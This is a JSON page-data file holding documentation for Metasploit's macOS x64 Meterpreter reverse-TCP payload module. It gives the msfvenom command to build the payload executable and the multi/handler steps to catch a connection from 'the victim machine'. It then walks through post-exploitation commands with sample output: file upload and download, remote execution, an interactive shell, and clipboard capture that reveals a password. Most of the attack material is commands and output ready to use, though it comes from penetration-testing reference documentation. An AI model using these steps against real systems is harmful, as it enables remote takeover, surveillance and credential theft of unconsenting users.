{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/osx/x64/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"76d981e2-616d-5fed-9f0b-1146b04cda50","name":"OSX Meterpreter, Reverse TCP Stager","fullname":"payload/osx/x64/meterpreter/reverse_tcp","description":"Inject the mettle server payload (staged). Connect, read length, read buffer, execute","rank":300,"fields":{"detailsSlug":"/modules/details/payload/osx/x64/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/osx/x64/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/osx/x64/meterpreter/reverse_tcp"},"documentation":{"html":"<p>osx/x64/meterpreter<em>reverse</em>tcp is similar to the linux meterpreter, but built for OSX.\nIt allows you to remotely take over the compromised system, having control of the file system,\nwebcam, microphone, screenshot and collect sensitive information such as credentials\nusing post modules, etc.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>osx/x64/meterpreter<em>reverse</em>tcp 64-bit MacOSX platforms from 10.8 onwards.</p>\n<h2 id=\"deploying-osxx64meterpreterreversetcp\" style=\"position:relative;\"><a href=\"#deploying-osxx64meterpreterreversetcp\" aria-label=\"deploying osxx64meterpreterreversetcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying osx/x64/meterpreter<em>reverse</em>tcp</h2>\n<p>To use osx/x64/meterpreter<em>reverse</em>tcp as an executable, first you can generate it with msfvenom:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=[IP] LPORT=4444 -f macho -o /tmp/payload.bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Before sending the executable to the victim machine, you need to set up the handler on your end:</p>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/handler</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD osx/x64/meterpreter_reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [Your IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<p>And that should start the listener. When the victim runs the malicious executable, you should\nreceive a session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; run\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 172.16.23.1:4444 \nmsf exploit(handler) &gt; [*] Meterpreter session 1 opened (172.16.23.1:4444 -&gt; 172.16.23.182:45009) at 2017-08-08 12:34:49 +0800\n\nmsf exploit(handler) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p>Here is a list of some of the common commands you might need while using Meterpreter:</p>\n<p><strong>pwd</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command tells you the current working directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\n/Users/User/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd /tmp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>cat</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat /tmp/data.txt\nhello world</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/data.bin /Users/User/Desktop\n[*] uploading  : /tmp/data.bin -&gt; /Users/User/Desktop\n[*] uploaded   : /tmp/data.bin -&gt; /Users/User/Desktop/data.bin\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>download</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you to download a file from the remote target to your machine. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download /Users/User/Desktop/data.bin /tmp\n[*] downloading: /Users/User/Desktop/data.bin -&gt; /tmp/data.bin\n[*] download   : /Users/User/Desktop/data.bin -&gt; /tmp/data.bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>ifconfig/ipconfig</strong></p>\n<p><code class=\"language-text\">ifconfig</code> and <code class=\"language-text\">ipconfig</code> are actually the same thing. They allow you to see the network\ninterfaces on the remote machine.</p>\n<p><strong>getuid</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command tells you the current user that Meterpreter is running on. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: uid=502, gid=20, euid=502, egid=20</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f echo -a &quot;hello &gt; /tmp/hello.txt&quot;\nProcess 5292 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>ps</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's terminal (or shell). For\nexample:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 29335 created.\nChannel 2 created.\ncat /tmp/hello.txt\nhello\nexit\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel or\n[CTRL]+[Z] then y (or the exit command) to terminate the channel.</p>\n<p><strong>sysinfo</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Such as:</p>\n<ul>\n<li>Computer name</li>\n<li>OS name</li>\n<li>Architecture</li>\n<li>Meterpreter type</li>\n</ul>\n<p>For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer     : My-Computer.local\nOS           : Mac OS X Sierra (MacOSX 10.12.6)\nArchitecture : x86\nMeterpreter  : x64/osx\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Extensions</strong></p>\n<p>OSX Meterpreter supports reading and writing to the clipboard with the extapi extension,\nyou can load it with the <code class=\"language-text\">load</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; load extapi\nLoading extension extapi...Success.\nmeterpreter &gt; clipboard_get_data\nText captured at\n=================\npa$$w0rd\n=================</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Other commands</strong></p>\n<p>For a complete list of OSX Meterpreter commands, do the following at the prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; help</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>"}}},"pageContext":{"id":"76d981e2-616d-5fed-9f0b-1146b04cda50"}}}